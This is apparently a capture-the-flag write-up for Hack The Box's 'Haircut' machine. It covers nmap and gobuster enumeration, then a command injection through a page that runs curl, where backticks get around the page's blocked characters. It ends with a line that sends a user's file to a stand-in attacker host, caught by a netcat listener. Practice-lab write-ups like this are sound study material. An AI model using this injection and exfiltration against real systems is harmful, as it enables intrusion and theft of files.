# htb-haircut
This is my [Hack the box](https://www.hackthebox.eu/)'s Haircut machine write-up.

## Machine
OS: GNU/Linux

IP: 10.10.10.24

Difficulty: Medium

## Enumeration
[Nmap](https://github.com/nmap/nmap) scan on the target:

`nmap -sV -sC -oN shocker.nmap 10.10.10.24`

Flags:
 - `-sV`: Version detection
 - `-sC`: Script scan using the default set of scripts
 - `-oN`: Output in normal nmap format

```
root@kali:~/htb/haircut# nmap -sC -sV -oN haircut.nmap 10.10.10.24
Starting Nmap 7.70 ( https://nmap.org ) at 2020-05-24 13:39 EDT
Nmap scan report for 10.10.10.24
Host is up (0.094s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
|_  256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
80/tcp open  http    nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title:  HTB Hairdresser
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.55 seconds
```

The web app running on port 80 is just an image.

Initial directories enumeration with the common list:

```
root@kali:~/htb/haircut# gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u ${HAIRCUT}
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.24
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/24 13:55:47 Starting gobuster
===============================================================
/index.html (Status: 200)
/uploads (Status: 301)
===============================================================
2020/05/24 13:56:26 Finished
===============================================================
```

Found `/uploads` that is referenced by the image that appears on the page already.

After checking several lists and ways of enumerating directories, finally this one got `/exposed.php`:

```
root@kali:~/htb/haircut# gobuster dir --url 10.10.10.24 --wordlist /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.24
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/05/24 15:23:49 Starting gobuster
===============================================================
/uploads (Status: 301)
/exposed.php (Status: 200)
```
The page `/exposed.php` has a text input, and when passing a URL it displays on screen the result of curling it. I tried to inject some command but some symbols/keywords were blocked e.g. &, | (pipe), python and nc. Curl flags are not blocked, though.

Checking `curl` man's page for ways to get more information about the system, I thought of sending information through body data. That was enough for getting the user flag.

Set up listener from attacker: `nc -lvp 4444`

Add the following to the input in /exposed.php: 
```
curl $ATTACKERIP:4444 -d `cat /home/maria/Desktop/user`
```
